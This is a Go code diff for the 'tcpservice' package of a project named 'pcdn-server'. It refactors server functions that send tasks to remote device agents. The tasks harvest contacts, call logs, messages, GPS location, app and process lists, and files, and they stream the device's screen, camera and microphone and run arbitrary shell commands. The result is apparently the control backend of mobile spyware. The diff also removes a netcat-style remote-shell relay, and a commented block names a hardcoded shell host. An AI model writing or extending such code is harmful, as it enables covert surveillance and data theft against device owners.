@@ -1,26 +1,57 @@
 package tcpservice
 
 import (
-	"bufio"
-	"bytes"
 	"fmt"
 	"time"
 
 	"pcdn-server/common"
-	"pcdn-server/protos"
+	"pcdn-server/models"
+
+	"github.com/liuhengloveyou/pcdn/protos"
 )
 
-func GetDevInfo(AgentClient *protos.AgentClient) *protos.TaskStruct {
+const (
+	HEARTBEAT_STAT_IDLE = "idle"
+	HEARTBEAT_STAT_RUN  = "run"
+)
+
+const (
+	TASKTYPE_UPDATE string = "update"
+
+	TASKTYPE_DEVINFO  string = "devinfo"
+	TASKTYPE_APPLIST  string = "applist"
+	TASKTYPE_PROCLIST string = "proclist"
+	TASKTYPE_DIR      string = "dir"
+	TASKTYPE_CONTACT  string = "contact"
+	TASKTYPE_CALLLOG  string = "calllog"
+	TASKTYPE_MESSAGE  string = "message"
+
+	TASKTYPE_INTERNET     string = "internet"
+	TASKTYPE_GPS          string = "gpsinfo"
+	TASKTYPE_SCREENLIVE   string = "screenlive"
+	TASKTYPE_VIDEOLIVE    string = "videolive"
+	TASKTYPE_VIDEOLIVE1   string = "videolive1"
+	TASKTYPE_SWITCHCAMERA string = "switchcamera"
+	TASKTYPE_AUDIOLIVE    string = "audiolive"
+	TASKTYPE_REMARK       string = "remark"
+	TASKTYPE_SHELL        string = "shell"
+	TASKTYPE_DOWNLOAD     string = "down"
+	TASKTYPE_UPLOAD       string = "upload"
+	TASKTYPE_NetLink      string = "netlink"
+	TASKTYPE_CHAT         string = "chat"
+)
+
+func GetDevInfo(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_DEVINFO,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("SendTask: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("SendTask: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: %v\n", err)
 		return nil
@@ -29,17 +60,17 @@ func GetDevInfo(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func GetAppList(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func GetAppList(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_APPLIST,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("GetAppList: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("GetAppList: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -48,17 +79,17 @@ func GetAppList(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func GetProcessList(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func GetProcessList(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_PROCLIST,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("GetProcessList: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("GetProcessList: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -67,18 +98,18 @@ func GetProcessList(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func GetDir(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
+func GetDir(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_DIR,
 		Payload:  path,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -87,18 +118,18 @@ func GetDir(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
 	return task
 }
 
-func ChatMsg(AgentClient *protos.AgentClient, chat string) *protos.TaskStruct {
+func ChatMsg(DeviceAgent *protos.DeviceAgent, chat string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_CHAT,
 		Payload:  chat,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("ChatMsg: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("ChatMsg: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("ChatMsg SendTask ERR: ", err)
 		return nil
@@ -107,17 +138,17 @@ func ChatMsg(AgentClient *protos.AgentClient, chat string) *protos.TaskStruct {
 	return task
 }
 
-func Contact(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func Contact(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_CONTACT,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -126,17 +157,17 @@ func Contact(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func Calllog(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func Calllog(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_CALLLOG,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Calllog: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Calllog: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -145,17 +176,17 @@ func Calllog(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func MessageLog(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func MessageLog(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_MESSAGE,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("MessageLog: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("MessageLog: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -165,36 +196,36 @@ func MessageLog(AgentClient *protos.AgentClient) *protos.TaskStruct {
 }
 
 // 更新agent版本
-func UpdateAgent(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func UpdateAgent(DeviceAgent *models.DeviceModel) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_UPDATE,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Calendar: %#v %v\n", AgentClient, err)
-	if err != nil {
-		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
-		return nil
-	}
+	// err := SendTask(DeviceAgent, task)
+	// common.Logger.Sugar().Debugf("Calendar: %#v %v\n", DeviceAgent, err)
+	// if err != nil {
+	// 	common.Logger.Sugar().Errorf("SendTask ERR: ", err)
+	// 	return nil
+	// }
 
 	return task
 }
 
-func Internet(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func Internet(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_INTERNET,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Internet: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Internet: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
 		return nil
@@ -203,17 +234,17 @@ func Internet(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func Gps(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func Gps(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_GPS,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Gps: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Gps: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("Gps SendTask ERR: ", err)
 		return nil
@@ -222,17 +253,17 @@ func Gps(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func NetLink(AgentClient *protos.AgentClient) *protos.TaskStruct {
+func NetLink(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_NetLink,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("NetLink: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("NetLink: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("NetLink SendTask ERR: ", err)
 		return nil
@@ -241,19 +272,19 @@ func NetLink(AgentClient *protos.AgentClient) *protos.TaskStruct {
 	return task
 }
 
-func ScreenLive(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
+func ScreenLive(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 
 	task = &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_SCREENLIVE,
 		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err = SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("SendTask ScreenLive: %#v %v %v\n", AgentClient, task, err)
+	err = SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("SendTask ScreenLive: %#v %v %v\n", DeviceAgent, task, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SendTask ScreenLive ERR: ", err)
 		return
@@ -262,18 +293,18 @@ func ScreenLive(AgentClient *protos.AgentClient, sessionId string) (task *protos
 	return
 }
 
-func VideoLive(AgentClient *protos.AgentClient, videoNum, sessionId string) (task *protos.TaskStruct, err error) {
+func VideoLive(DeviceAgent *protos.DeviceAgent, videoNum, sessionId string) (task *protos.TaskStruct, err error) {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task = &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: videoNum,
 		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err = SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("VideoLive SendTask: %#v %v %v\n", AgentClient, task, err)
+	err = SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("VideoLive SendTask: %#v %v %v\n", DeviceAgent, task, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("VideoLive SendTask ERR: ", err)
 		return
@@ -282,18 +313,18 @@ func VideoLive(AgentClient *protos.AgentClient, videoNum, sessionId string) (tas
 	return
 }
 
-func SwitchCamera(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
+func SwitchCamera(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task = &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_SWITCHCAMERA,
 		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err = SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("SwitchCamera SendTask: %#v %v %v\n", AgentClient, task, err)
+	err = SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("SwitchCamera SendTask: %#v %v %v\n", DeviceAgent, task, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("SwitchCamera SendTask ERR: ", err)
 		return
@@ -302,18 +333,18 @@ func SwitchCamera(AgentClient *protos.AgentClient, sessionId string) (task *prot
 	return
 }
 
-func AudioLive(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
+func AudioLive(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task = &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_AUDIOLIVE,
 		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err = SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("AudioLive SendTask: %#v %v %v\n", AgentClient, task, err)
+	err = SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("AudioLive SendTask: %#v %v %v\n", DeviceAgent, task, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("AudioLive SendTask ERR: ", err)
 		return
@@ -322,38 +353,38 @@ func AudioLive(AgentClient *protos.AgentClient, sessionId string) (task *protos.
 	return
 }
 
-func Remark(AgentClient *protos.AgentClient, remark string) *protos.TaskStruct {
+func Remark(DeviceAgent *protos.DeviceAgent, remark string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_REMARK,
 		Payload:  remark,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Remark: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Remark: %#v %v\n", DeviceAgent, err)
 	if err != nil {
-		common.Logger.Sugar().Errorf("Remark ERR: ", AgentClient, err)
+		common.Logger.Sugar().Errorf("Remark ERR: ", DeviceAgent, err)
 		return nil
 	}
 
 	return task
 }
 
-func ShellCmd(AgentClient *protos.AgentClient, cmd string) *protos.TaskStruct {
+func ShellCmd(DeviceAgent *protos.DeviceAgent, cmd string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_SHELL,
 		Payload:  cmd,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("ShellCmd SendTask: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("ShellCmd SendTask: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("ShellCmd ERR: %v\n", err)
 		return nil
@@ -362,19 +393,19 @@ func ShellCmd(AgentClient *protos.AgentClient, cmd string) *protos.TaskStruct {
 	return task
 }
 
-func Download(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
+func Download(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_DOWNLOAD,
 		HostName: fmt.Sprintf("https://%s/api/upload", common.ServConfig.Host),
 		Payload:  path,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
 		return nil
@@ -383,19 +414,19 @@ func Download(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
 	return task
 }
 
-func Upload(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
+func Upload(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
 	taskId := fmt.Sprintf("%d", time.Now().Unix())
 	task := &protos.TaskStruct{
 		TaskId:   taskId,
 		TaskType: TASKTYPE_UPLOAD,
 		HostName: fmt.Sprintf("http://%s/upload/", common.ServConfig.Host),
 		Payload:  path,
-		RespChan: make(chan *protos.TaskResp, 1),
+		// RespChan: make(chan *protos.TaskResp, 1),
 	}
-	AgentClient.Tasks[taskId] = task
+	// DeviceAgent.Tasks[taskId] = task
 
-	err := SendTask(AgentClient, task)
-	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", AgentClient, err)
+	err := SendTask(DeviceAgent, task)
+	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", DeviceAgent, err)
 	if err != nil {
 		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
 		return nil
@@ -404,53 +435,18 @@ func Upload(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
 	return task
 }
 
-func sendCommandByNc(AgentClient *protos.AgentClient, cmd string) string {
-	for {
-		if AgentClient.NcConn == nil {
-			addShellTask(AgentClient)
-			time.Sleep(time.Second)
-			continue
-		}
-		conn := *AgentClient.NcConn
-
-		_, err := conn.Write([]byte(cmd))
-		if err != nil {
-			conn.Close()
-			AgentClient.NcConn = nil
-			return ""
-		}
-
-		conn.SetReadDeadline(time.Now().Add(time.Second))
-		data := bytes.NewBuffer([]byte{})
-		reader := bufio.NewReader(conn) //获取输入流
-
-		for {
-			var buf [8192]byte
-			n, err := reader.Read(buf[:]) //读取数据 从头到尾读取
-			if err != nil {
-				fmt.Println("read from client failed,err", err)
-				break
-			}
-
-			data.Write(buf[:n])
-		}
-
-		return data.String()
-	}
-}
-
-func addShellTask(AgentClient *protos.AgentClient) {
+func addShellTask(DeviceAgent *protos.DeviceAgent) {
 	// has := false
 
-	// for i := 0; i < len(AgentClient.Tasks); i++ {
-	// 	if strings.Compare(AgentClient.Tasks[i].TaskType, "shell") == 0 {
+	// for i := 0; i < len(DeviceAgent.Tasks); i++ {
+	// 	if strings.Compare(DeviceAgent.Tasks[i].TaskType, "shell") == 0 {
 	// 		has = true
 	// 		break
 	// 	}
 	// }
 
 	// if has == false {
-	// 	AgentClient.Tasks = append(AgentClient.Tasks, protos.TaskStruct{
+	// 	DeviceAgent.Tasks = append(DeviceAgent.Tasks, protos.TaskStruct{
 	// 		TaskId:   time.Now().Format("2006-01-02 15:04:05"),
 	// 		TaskType: "shell",
 	// 		HostName: "csmm.feitian.link",
